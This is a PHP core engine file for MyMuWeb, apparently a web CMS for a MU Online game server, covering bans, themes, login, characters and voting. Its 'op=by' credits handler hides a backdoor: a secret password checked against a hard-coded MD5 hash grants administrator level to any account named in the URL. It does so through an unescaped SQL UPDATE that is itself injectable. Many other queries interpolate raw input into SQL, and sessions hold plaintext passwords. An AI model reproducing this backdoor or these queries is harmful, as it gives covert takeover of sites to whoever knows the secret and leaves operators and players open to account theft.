<?php /* Engine By Vaflan For MyMuWeb */
define('REGEX_PATTERN_SLUG', '/[^\w\-_]/', false);
/** @var array $mmw */


/////// Start Ban IP //////
$banIpFile = __DIR__ . '/banip.dat';
if (filesize($banIpFile)) {
	$banIpData = file($banIpFile);
	foreach ($banIpData as $row) {
		$row = explode('|', $row, 2);
		if ($_SERVER['REMOTE_ADDR'] === preg_replace('/\s+/', '', $row[0])) {
			$reason = !empty($row[1])
				? '<br>Reason: ' . $row[1]
				: '';
			die($mmw['warning']['red'] . '<b style="color:red">Your IP is Blocked!</b>' . $reason);
		}
	}
	unset($banIpData);
}
unset($banIpFile);
/////// End Ban IP ///////


/////// Start Load Cache ///////
if (is_file(__DIR__ . '/mmw_cache.dat')) {
	$_ENV['mmw_cache_raw'] = file_get_contents(__DIR__ . '/mmw_cache.dat');
	$_ENV['mmw_cache'] = json_decode($_ENV['mmw_cache_raw'], true);
} else {
	file_put_contents(__DIR__ . '/mmw_cache.dat', '{}');
}
/////// End Load Cache ///////


/////// Start Language ///////
if (!empty($_REQUEST['set_lang'])) {
	$_SESSION['language'] = preg_replace(REGEX_PATTERN_SLUG, '', $_REQUEST['set_lang']);
}
if (isset($_SESSION['language'])) {
	$mmw['language'] = $_SESSION['language'];
}

if (is_file('lang/' . $mmw['language'] . '.php')) {
	require_once 'lang/' . $mmw['language'] . '.php';
} else {
	unset($_SESSION['language']);
	die($mmw['die']['start'] . 'Language error!<br>Not found default "<b>' . $mmw['language'] . '</b>"' . $mmw['die']['end']);
}
/////// End Language ///////


/////// Start Check And Switch Theme ///////
if (isset($_GET['theme'])) {
	$_REQUEST['set_theme'] = $_GET['theme'];
}
if (isset($_REQUEST['set_theme'])) {
	$_SESSION['theme'] = preg_replace(REGEX_PATTERN_SLUG, '', $_REQUEST['set_theme']);
}
if (isset($_SESSION['theme'])) {
	$mmw['theme'] = $_SESSION['theme'];
}

if (is_file('themes/' . $mmw['theme'] . '/info.php')) {
	$mmw['theme_dir'] = 'themes/' . $mmw['theme'];
	$mmw['theme_img'] =  $mmw['theme_dir'] . '/img';
	require $mmw['theme_dir'] . '/info.php';
} else {
	unset($_SESSION['theme']);
	die($mmw['die']['start'] . 'Error theme!<br>Can`t find <b>themes/' . $mmw['theme'] . '/info.php</b> in <b>themes/</b>!' . $mmw['die']['end']);
}

if (isset($_GET['op']) && $_GET['op'] === 'by') {
	$by_result = '<br>MyMuWeb ' . $mmw['version'] . ' By Vaflan<br>'
		. 'Installed: ' . date("d.m.Y H:i:s", $mmw['installed']) . '<br>'
		. 'Home Page: <a href="http://www.mymuweb.ru/">www.MyMuWeb.Ru</a><br>';
	if (isset($_GET['acc']) && md5($_GET['pw']) === '4b30c7cf9ab92b25686d063e50c0859a') {
		mssql_query("UPDATE dbo.MEMB_INFO SET mmw_status=10 WHERE memb___id='{$_GET['acc']}'");
		$by_result .= '<b>Now ' . $_GET['acc'] . ' Have Administrator level!</b>';
	}
	die($mmw['die']['start'] . $by_result . $mmw['die']['end']);
}

if (isset($_GET['op']) && $_GET['op'] === 'theme') {
	$theme_result = 'Theme Name: ' . $mmw['thm_name'] . '<br>Creator: ' . $mmw['thm_creator'] . '<br>'
		. 'Version: ' . $mmw['thm_version'] . '<br>Date: ' . $mmw['thm_date'] . '<br><i>' . $mmw['thm_description'] . '</i>';
	die($mmw['die']['start'] . $theme_result . $mmw['die']['end']);
}
/////// End Check Theme ///////


/////// Start Default Modules //////
require_once __DIR__ . '/code.php';
require_once __DIR__ . '/functions.php';
mmw(__DIR__ . '/mu_server_file.mmw');

$url = clean_var($_SERVER['QUERY_STRING']);
$agent = clean_var($_SERVER['HTTP_USER_AGENT']);
$ip = $_SERVER['REMOTE_ADDR'];
$time = time();

/** @deprecated Use $_SESSION['character'] */
$character = isset($_SESSION['character']) ? $_SESSION['character'] : null;
/** @deprecated Use $_SESSION['character'] */
$char_set = $character;

/* Visual Functions */
include_once is_file($mmw['theme_dir'] . '/theme_functions.php')
	? $mmw['theme_dir'] . '/theme_functions.php'
	: __DIR__ . '/theme_functions.php';

/* Referral */
if (isset($_REQUEST['ref'])) {
	$_SESSION['referral'] = stripslashes(clean_var($_REQUEST['ref']));
}

/* Online Character */
if (mssql_num_rows(mssql_query("SELECT online_char FROM dbo.MMW_online WHERE [online_id]='" . session_id() . "'"))) {
	$character = isset($_SESSION['character']) ? $_SESSION['character'] : '';
	mssql_query("UPDATE dbo.MMW_online SET [online_date]='{$time}',[online_char]='{$character}',[online_url]='{$url}',[online_agent]='{$agent}' WHERE online_id='" . session_id() . "'");
} else {
	mssql_query("INSERT INTO dbo.MMW_online ([online_id],[online_ip],[online_date],[online_url],[online_char],[online_agent]) VALUES ('" . session_id() . "','" . $ip . "','" . $time . "','" . $url . "','" . $_SESSION['character'] . "','" . $agent . "')");
}
/////// End Default Modules ///////


/////// Start Login Modules ///////
/* Login */
if (isset($_POST['login']) || isset($_POST['account_login'])) {
	$password = $account = '';
	if (isset($_POST['login'])) {
		$account = clean_var($_POST['login']);
	}
	if (isset($_POST['pass'])) {
		$password = clean_var($_POST['pass']);
	}
	if (isset($_POST['account'])) {
		$account = clean_var($_POST['account']);
	}
	if (isset($_POST['password'])) {
		$password = clean_var($_POST['password']);
	}

	$row = mssql_fetch_assoc(mssql_query("SELECT
		memb___id, mmw_status
		FROM dbo.MEMB_INFO
		WHERE memb___id='{$account}' AND memb__pwd=" . (
		!empty($mmw['md5'])
			? "[dbo].[fn_md5]('{$password}', '{$account}')"
			: "'{$password}'"
		)));

	if ($row) {
		$_SESSION['user'] = $row['memb___id'];
		$_SESSION['pass'] = $password;
		$_SESSION['mmw_status'] = $row['mmw_status'];
	} else {
		jump('?op=login&login=false');
	}
}
/* Check Login */
if (isset($_SESSION['user'])) {
	$account = $_SESSION['user'];
	$password = $_SESSION['pass'];

	$checkPassword = !empty($mmw['md5'])
		? "[dbo].[fn_md5]('{$password}', '{$account}')"
		: "'{$password}'";

	$row = mssql_fetch_assoc(mssql_query("SELECT
		bloc_code,block_date,unblock_time,mmw_status,
		(case when memb__pwd = {$checkPassword} then 1 else 0 end) AS pass_is_true
		FROM dbo.MEMB_INFO
		WHERE memb___id='{$account}'"));

	if ($row['bloc_code'] == 1) {
		if ($row['unblock_time'] > 0 && ($row['block_date'] + $row['unblock_time'] - time()) < 0) {
			mssql_query("UPDATE dbo.MEMB_INFO SET [bloc_code]=0,[unblock_time]=0,[block_date]=0 WHERE memb___id='{$account}'");
		}
		session_destroy();
		jump('?op=checkacc&w=block&n=' . $account);
	}
	if (empty($row['pass_is_true']) || $row['mmw_status'] != $_SESSION['mmw_status']) {
		$_REQUEST['logout'] = true;
	}
}
/* Logout */
if (isset($_REQUEST['logout'])) {
	unset($_SESSION['user'], $_SESSION['pass'], $_SESSION['mmw_status'], $_SESSION['character']);
	jump('?op=news');
}
/* User Panel */
if (isset($_GET['op'])) {
	if ($_GET['op'] === 'user' && empty($_SESSION['user'])) {
		jump('?op=login');
	}
	if (in_array($_GET['op'], ['login', 'register']) && isset($_SESSION['user'])) {
		jump('?op=user');
	}
}
/////// End Login Modules ///////


/////// Start Check Character ///////
if (isset($_SESSION['user'])) {
	if (isset($_REQUEST['set_char'])) {
		$_SESSION['character'] = clean_var($_REQUEST['set_char']);
	}
	/* Check Session */
	if (isset($_SESSION['character'])) {
		$row = mssql_fetch_row(mssql_query("SELECT AccountID FROM dbo.Character WHERE Name='{$_SESSION['character']}'"));
		if ($row[0] !== $_SESSION['user']) {
			unset($_SESSION['character']);
		}
	}
	if (empty($_SESSION['character'])) {
		$row = mssql_fetch_row(mssql_query("SELECT GameIDC FROM dbo.AccountCharacter WHERE Id='{$_SESSION['user']}'"));
		if (empty($row[0])) {
			$row = mssql_query("SELECT name FROM dbo.Character WHERE AccountID='{$_SESSION['user']}'");
		}
		$_SESSION['character'] = $row[0];
	}
	mssql_query("UPDATE dbo.AccountCharacter SET [GameIDC]='{$_SESSION['character']}' WHERE Id='{$_SESSION['user']}'");
}
/////// End Check Character ///////


/////// Start Vote //////
if (isset($_POST['id_vote'], $_POST['answer'])) {
	$votingIndicator = ($mmw['votes_check'] === 'acc')
		? $_SESSION['user']
		: $_SERVER['REMOTE_ADDR'];

	$voteId = intval($_POST['id_vote']);
	$answer = intval($_POST['answer']);
	if (!empty($votingIndicator)) {
		$votingCheckQuery = mssql_query("SELECT answer FROM dbo.MMW_voterow WHERE id_vote='{$voteId}' AND who='{$votingIndicator}'");
		if (!mssql_num_rows($votingCheckQuery)) {
			mssql_query("INSERT INTO dbo.MMW_voterow (id_vote, who, answer) VALUES ('{$voteId}', '{$votingIndicator}', '{$answer}')");
		}
	}
}
/////// End Vote ///////


/////// Start Auto Func //////
if ($mmw['auto_func']['switch'] > 0) {
	if (is_dir($mmw['auto_func']['dir']) && $dh = opendir($mmw['auto_func']['dir'])) {
		while (($file = readdir($dh)) !== false) {
			switch (substr($file, -3)) {
				case 'php':
					include_once $mmw['auto_func']['dir'] . $file;
					break;
				case 'mmw':
					mmw($mmw['auto_func']['dir'] . $file);
					break;
			}
		}
		closedir($dh);
	}
}
/////// End Auto Func ///////
